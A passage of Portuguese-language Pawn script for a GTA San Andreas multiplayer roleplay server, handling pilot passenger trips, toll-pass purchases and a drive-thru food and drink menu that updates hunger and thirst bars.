							TimerPiloto[playerid] = SetTimerEx("CarregarPassageiros", 5000, true, "ii", playerid, 1);
					    }
				    }
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 553)
					{
						if(WE_GetInt(f(playerid), "ViagensPiloto") >= 50)
						{
							SendClientMessage(playerid, COR_PILOTO, "Você iniciou uma viagem para Las Venturas no Nevada!");
							SendClientMessage(playerid, COR_PILOTO, "Cada passageiro entra a cada 6 segundos e tem o valor de {00FF00}R$130{7FFFD4} e o máximo de 25 passageiros!");
							SendClientMessage(playerid, COR_PILOTO, "Se quiser decolar digite {FF0000}/Decolagem{7FFFD4}.");
							ViagemPiloto[playerid] = 3;
							PassageirosPiloto[playerid] = 0;
							TimerPiloto[playerid] = SetTimerEx("CarregarPassageiros", 5000, true, "ii", playerid, 1);
					    }
				    }
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 577)
					{
						if(WE_GetInt(f(playerid), "ViagensPiloto") >= 75)
						{
							SendClientMessage(playerid, COR_PILOTO, "Você iniciou uma viagem para Las Venturas no AT400!");
							SendClientMessage(playerid, COR_PILOTO, "Cada passageiro entra a cada 6 segundos e tem o valor de {00FF00}R$130{7FFFD4} e o máximo de 40 passageiros!");
							SendClientMessage(playerid, COR_PILOTO, "Se quiser decolar digite {FF0000}/Decolagem{7FFFD4}.");
							ViagemPiloto[playerid] = 4;
							PassageirosPiloto[playerid] = 0;
							TimerPiloto[playerid] = SetTimerEx("CarregarPassageiros", 5000, true, "ii", playerid, 1);
					    }
				    }
					return 1;
				}
				case 1:
				{
					TogglePlayerControllable(playerid, 0);
					if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 511)
					{
						if(WE_GetInt(f(playerid), "ViagensPiloto") < 25)
						{
							SendClientMessage(playerid, COR_PILOTO, "Você iniciou uma viagem para Los Santos no Beagle!");
							SendClientMessage(playerid, COR_PILOTO, "Cada passageiro entra a cada 6 segundos e tem o valor de {00FF00}R$130{7FFFD4} e o máximo de 10 passageiros!");
							SendClientMessage(playerid, COR_PILOTO, "Se quiser decolar digite {FF0000}/Decolagem{7FFFD4}.");
							ViagemPiloto[playerid] = 1;
							PassageirosPiloto[playerid] = 0;
							TimerPiloto[playerid] = SetTimerEx("CarregarPassageiros", 5000, true, "ii", playerid, 2);
					    }
					}
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 519)
					{
						if(WE_GetInt(f(playerid), "ViagensPiloto") >= 25)
						{
							SendClientMessage(playerid, COR_PILOTO, "Você iniciou uma viagem para Los Santos no Shamal!");
							SendClientMessage(playerid, COR_PILOTO, "Cada passageiro entra a cada 6 segundos e tem o valor de {00FF00}R$130{7FFFD4} e o máximo de 15 passageiros!");
							SendClientMessage(playerid, COR_PILOTO, "Se quiser decolar digite {FF0000}/Decolagem{7FFFD4}.");
							ViagemPiloto[playerid] = 2;
							PassageirosPiloto[playerid] = 0;
							TimerPiloto[playerid] = SetTimerEx("CarregarPassageiros", 5000, true, "ii", playerid, 2);
					    }
				    }
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 553)
					{
						if(WE_GetInt(f(playerid), "ViagensPiloto") >= 50)
						{
							SendClientMessage(playerid, COR_PILOTO, "Você iniciou uma viagem para Los Santos no Nevada!");
							SendClientMessage(playerid, COR_PILOTO, "Cada passageiro entra a cada 6 segundos e tem o valor de {00FF00}R$130{7FFFD4} e o máximo de 25 passageiros!");
							SendClientMessage(playerid, COR_PILOTO, "Se quiser decolar digite {FF0000}/Decolagem{7FFFD4}.");
							ViagemPiloto[playerid] = 3;
							PassageirosPiloto[playerid] = 0;
							TimerPiloto[playerid] = SetTimerEx("CarregarPassageiros", 5000, true, "ii", playerid, 2);
					    }
				    }
					else if(GetVehicleModel(GetPlayerVehicleID(playerid)) == 577)
					{
						if(WE_GetInt(f(playerid), "ViagensPiloto") >= 75)
						{
							SendClientMessage(playerid, COR_PILOTO, "Você iniciou uma viagem para Los Santos no AT400!");
							SendClientMessage(playerid, COR_PILOTO, "Cada passageiro entra a cada 6 segundos e tem o valor de {00FF00}R$130{7FFFD4} e o máximo de 40 passageiros!");
							SendClientMessage(playerid, COR_PILOTO, "Se quiser decolar digite {FF0000}/Decolagem{7FFFD4}.");
							ViagemPiloto[playerid] = 4;
							PassageirosPiloto[playerid] = 0;
							TimerPiloto[playerid] = SetTimerEx("CarregarPassageiros", 5000, true, "ii", playerid, 2);
					    }
				    }
					return 1;
				}
			}
		}
	}
	if(dialogid == 5416) {
		if(response) {
			switch(listitem) {
				case 0: {
				    if(GetPlayerCash(playerid) < 900) return SendClientMessage(playerid,COR_ERRO,"Você não tem R$900 reais!");
					SendClientMessage(playerid, AZUL_WE, "Você comprou 10 passagens Via Fácil!");
					ViaFacil[playerid] += 10;
					GivePlayerCash(playerid, -900);
				} case 1: {
				    if(GetPlayerCash(playerid) < 1900) return SendClientMessage(playerid,COR_ERRO,"Você não tem R$1900 reais!");
					SendClientMessage(playerid, AZUL_WE, "Você comprou 20 passagens Via Fácil!");
					ViaFacil[playerid] += 20;
					GivePlayerCash(playerid, -1900);
				} case 2: {
				    if(GetPlayerCash(playerid) < 2800) return SendClientMessage(playerid,COR_ERRO,"Você não tem R$2800 reais!");
					SendClientMessage(playerid, AZUL_WE, "Você comprou 30 passagens Via Fácil!");
					ViaFacil[playerid] += 30;
					GivePlayerCash(playerid, -2800);
				} case 3: {
				    if(GetPlayerCash(playerid) < 4700) return SendClientMessage(playerid,COR_ERRO,"Você não tem R$4700 reais!");
					SendClientMessage(playerid, AZUL_WE, "Você comprou 50 passagens Via Fácil!");
					ViaFacil[playerid] += 50;
					GivePlayerCash(playerid, -4700);
				} case 4: {
				    if(GetPlayerCash(playerid) < 9000) return SendClientMessage(playerid,COR_ERRO,"Você não tem R$9000 reais!");
					SendClientMessage(playerid, AZUL_WE, "Você comprou 100 passagens Via Fácil!");
					ViaFacil[playerid] += 100;
					GivePlayerCash(playerid, -9000);
				}
			}
		}
	}
//------------------------------ DriveThru -------------------------------------
	if(dialogid == DriveThru)
	{
		if(!response) { return 1; }
		switch(listitem)
		{
			case 0://Bebida
			{
				strcat(StrBebT, "Agua Natural - {3DB134}R$3,00\nAgua com Gás - {3DB134}R$3,00\nCoca-Cola - {3DB134}R$7,00\nGuarana - {3DB134}R$5,00\nFanta Uva - {3DB134}R$4,00\n");
				strcat(StrBebT, "Fanta Laranja - {3DB134}R$4,00\nItubaina - {3DB134}R$4,00\nSprite - {3DB134}R$3,00\nKuat - {3DB134}R$3,00\nSuco de Maçã - {3DB134}R$2,00\n");
				strcat(StrBebT, "Suco de Laranja - {3DB134}R$2,00\nSuco de Limão - {3DB134}R$2,00\nSuco de Maracuja - {3DB134}R$2,00\nSuco de Morango - {3DB134}R$2,00\n");
				strcat(StrBebT, "Suco de Abacaxi - {3DB134}R$2,00\nCafé - {3DB134}R$3,00\nCafé com Leite - {3DB134}R$3,00");
				ShowPlayerDialog(playerid, Bebida, DIALOG_STYLE_LIST, "Bebidas", StrBebT, "Comprar", "Sair");
			}
			case 1://Lanche
			{
				strcat(StrBebT, "Arroz & Feijão - {3DB134}R$25,00\nFeijoada - {3DB134}R$18,00\nLasanha de Frango - {3DB134}R$35,00\nLasanha de Carne - {3DB134}R$35,00\n");
				strcat(StrBebT, "Porção de Frango F. - {3DB134}R$20,00\nPorção de Batata F. - {3DB134}R$22,00\nPorção de Mandioca - {3DB134}R$18,00\nPastel - {3DB134}R$5,00\n");
				strcat(StrBebT, "Esfirra de Carne - {3DB134}R$4,00\nEsfirra de Frango - {3DB134}R$4,00\nPizza de Queijo - {3DB134}R$24,00\nPizza de Calabresa - {3DB134}R$25,00\n");
				strcat(StrBebT, "Pizza de Bacon - {3DB134}R$30,00\nPizza de Bauru - {3DB134}R$23,00");
				ShowPlayerDialog(playerid, Lanche, DIALOG_STYLE_LIST, "Comidas", StrBebT, "Comprar", "Sair");
			}
			/*case 2://Sobremesa
			{
				strcat(StrBebT, "Sorvete - {3DB134}R$2,00\nBolo - {3DB134}R$7,00\nMilk Shake - {3DB134}R$6,00\nPudim - {3DB134}R$2,00\nTorta - {3DB134}R$6,00\n");
				strcat(StrBebT, "Brigadeiro  - {3DB134}R$3,00\nMousse - {3DB134}R$3,00\nQuindim - {3DB134}R$3,00\nPavê - {3DB134}R$4,00");
				ShowPlayerDialog(playerid, Sobremesa, DIALOG_STYLE_LIST, "Comidas", StrBebT, "Comprar", "Sair");
			}*/
		}
		if(dialogid == Bebida)
		{
			if(!response) { return 1; }
			switch(listitem)
			{
				case 0://Agua Natural
				{
					if(GetPlayerCash(playerid) < 3) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$3 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid, 0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -3);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar uma {FFFFFF}Água Natural");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+100);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 1://Coca Cola
				{
					if(GetPlayerCash(playerid) < 7) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$7 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid, 0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -7);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar uma {FFFFFF}Coca-Cola");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+70);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 2://Guarana
				{
					if(GetPlayerCash(playerid) < 5) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$5 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid, 0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -5);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar um {FFFFFF}Guaraná");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+50);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 3://Fanta Uva
				{
					if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$4 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -4);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar uma {FFFFFF}Fanta Uva");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+40);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 4://Fanta Laranja
				{
					if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$4 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -4);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar uma {FFFFFF}Fanta Laranja");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+40);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 5://Itubaina
				{
					if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$4 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -4);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar uma {FFFFFF}Itubaina");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+40);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 6://Sprite
				{
					if(GetPlayerCash(playerid) < 3) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$3 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -3);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar uma {FFFFFF}Sprite");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+30);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 7://Kuat
				{
					if(GetPlayerCash(playerid) < 3) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$3 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -3);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar uma {FFFFFF}Kuat");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+40);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 8://Suco de Maçã
				{
					if(GetPlayerCash(playerid) < 2) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$2 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -2);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar um {FFFFFF}Suco de Maçã");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+30);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 9://Suco de Laranja
				{
					if(GetPlayerCash(playerid) < 2) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$2 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -2);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar um {FFFFFF}Suco de Laranja");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+30);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 10://Suco de Limão
				{
					if(GetPlayerCash(playerid) < 2) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$2 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -2);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar um {FFFFFF}Suco de Limão");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+30);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 11://Suco de Maracuja
				{
					if(GetPlayerCash(playerid) < 2) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$2 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -2);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar um {FFFFFF}Suco de Maracuja");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+30);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 12://Suco de Morango
				{
					if(GetPlayerCash(playerid) < 2) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$2 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -2);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar um {FFFFFF}Suco de Morango");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+30);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 13://Suco de Abacaxi
				{
					if(GetPlayerCash(playerid) < 2) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$2 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,0x0D85B5FF,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -2);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar um {FFFFFF}Suco de Abacaxi");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+30);
					SetStatusBar(playerid, BAR_SEDE, Player_barDrink[playerid], GetPVarInt(playerid,"Sede"));
				}
				case 14:
				{
					ShowPlayerDialog(playerid, DriveThru, DIALOG_STYLE_LIST, "Cardápio - DriveThru","- Bebida\n\n- Lanche", "Comprar", "Cancelar");
					return 1;
				}
			}
		}
		if(dialogid == Lanche)
		{
			if(!response) { return 1; }
			switch(listitem)
			{
				case 0://Arroz & Feijão
				{
					if(GetPlayerCash(playerid) < 25) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$25 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerCash(playerid, -25);
					SendClientMessage(playerid,0xFF8C00FF,"Você acabou de comprar um prato de {FFFFFF}Arroz & Feijão");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+80);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 1://Feijoada
				{

					if(GetPlayerCash(playerid) < 18) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$18 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -18);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Feijoada");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+70);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 2://Lasanha de Frango
				{
					if(GetPlayerCash(playerid) < 35) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$35 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -35);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Lasanha de Frango");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+100);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 3://Lasanha de Carne
				{
					if(GetPlayerCash(playerid) < 35) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$35 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -35);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Lasanha de Carne");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+100);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 4://Porção de Frango F.
				{
					if(GetPlayerCash(playerid) < 20) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$20 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -20);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Porção de Frango Frito");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+75);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 5://Porção de Batata F.
				{
					if(GetPlayerCash(playerid) < 22) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$22 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -22);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Porção de Batata Frita");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+80);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 6://Porção de Mandioca F.
				{
					if(GetPlayerCash(playerid) < 18) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$18 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -18);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Porção de Mandioca Frita");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+70);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 7://Pastel
				{
					if(GetPlayerCash(playerid) < 5) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$5 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -5);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer um {FFFFFF}Pastel");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+15);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 8://Esfirra de Carne
				{
					if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$4 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -4);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Esfirra de Carne");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+13);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 9://Esfirra de Carne
				{
					if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$4 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -4);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Esfirra de Frango");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+13);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 10://Pizza de Queijo
				{
					if(GetPlayerCash(playerid) < 24) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$24 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -24);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Pizza de Queijo");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+80);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 11://Pizza de Calabresa
				{
					if(GetPlayerCash(playerid) < 25) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$25 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -25);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Pizza de Calabresa");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+80);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 12://Pizza de Bacon
				{
					if(GetPlayerCash(playerid) < 25) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$25 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -25);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Pizza de Bacon");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+80);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 13://Pizza de Bauru
				{
					if(GetPlayerCash(playerid) < 30) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$30 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,0xFF8C00FF,"Você está satisfeito, não precisa comer!");
					GivePlayerMoney(playerid, -30);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Pizza de Bauru");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+100);
					SetStatusBar(playerid, BAR_FOME, Player_barEat[playerid], GetPVarInt(playerid,"Fome"));
				}
				case 14:
				{
					ShowPlayerDialog(playerid, DriveThru, DIALOG_STYLE_LIST, "Cardápio - DriveThru","- Bebida\n\n- Lanche", "Comprar", "Cancelar");
					return 1;
				}
			}
		}
		/*if(dialogid == Sobremesa)
		{
			if(!response) { return 1; }
			switch(listitem)
			{
				case 0://Sorvete
				{
					if(GetPlayerCash(playerid) < 3) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$2 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100 && GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,COR_VERDECLARO,"[ESPECIAL] Você está satisfeito, não precisa comer nem beber!");
					GivePlayerCash(playerid, -2);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar um {FFFFFF}Sorvete");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+20);
					SetProgressBarValue(barsede, GetPVarInt(playerid,"Sede"));
					UpdateProgressBar(barsede,playerid);
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+20);
					SetProgressBarValue(barfome, GetPVarInt(playerid,"Fome"));
					UpdateProgressBar(barfome,playerid);
				}
				case 1://Bolo
				{
					if(GetPlayerCash(playerid) < 7) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$7 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,COR_VERDECLARO,"Você está satisfeito, não precisa comer!");
					GivePlayerCash(playerid, -7);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer um {FFFFFF}Bolo");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Fome")+45);
					SetProgressBarValue(barfome, GetPVarInt(playerid,"Fome"));
					UpdateProgressBar(barfome,playerid);
				}
				case 2://Milk Shake
				{
					if(GetPlayerCash(playerid) < 5) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$6 para comprar!");
					if(GetPVarInt(playerid,"Sede") >= 100) return SendClientMessage(playerid,COR_VERDECLARO,"Você está satisfeito, não precisa beber!");
					GivePlayerCash(playerid, -6);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de tomar um {FFFFFF}Milk Shake");
					SetPVarInt(playerid,"Sede",GetPVarInt(playerid,"Sede")+40);
					SetProgressBarValue(barsede, GetPVarInt(playerid,"Sede"));
					UpdateProgressBar(barsede,playerid);
				}
				case 3://Pudim
				{
					if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$2 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,COR_VERDECLARO,"Você está satisfeito, não precisa comer!");
					GivePlayerCash(playerid, -2);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer um {FFFFFF}Pudim");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+15);
					SetProgressBarValue(barfome, GetPVarInt(playerid,"Fome"));
					UpdateProgressBar(barfome,playerid);
				}
				case 4://Torta
				{
					if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$6 para comprar!");
					if(GetPVarInt(playerid,"Fome") >= 100) return SendClientMessage(playerid,COR_VERDECLARO,"Você está satisfeito, não precisa comer!");
					GivePlayerCash(playerid, -6);
					SendClientMessage(playerid, 0x1E90FFFF,"Você acabou de comer uma {FFFFFF}Torta");
					SetPVarInt(playerid,"Fome",GetPVarInt(playerid,"Fome")+40);
					SetProgressBarValue(barfome, GetPVarInt(playerid,"Fome"));
					UpdateProgressBar(barfome,playerid);
				}
				case 5://Brigadeiro
				{
					if(GetPlayerCash(playerid) < 4) return SendClientMessage(playerid, 0xFF0000FF,"Você não tem R$2 para comprar!");
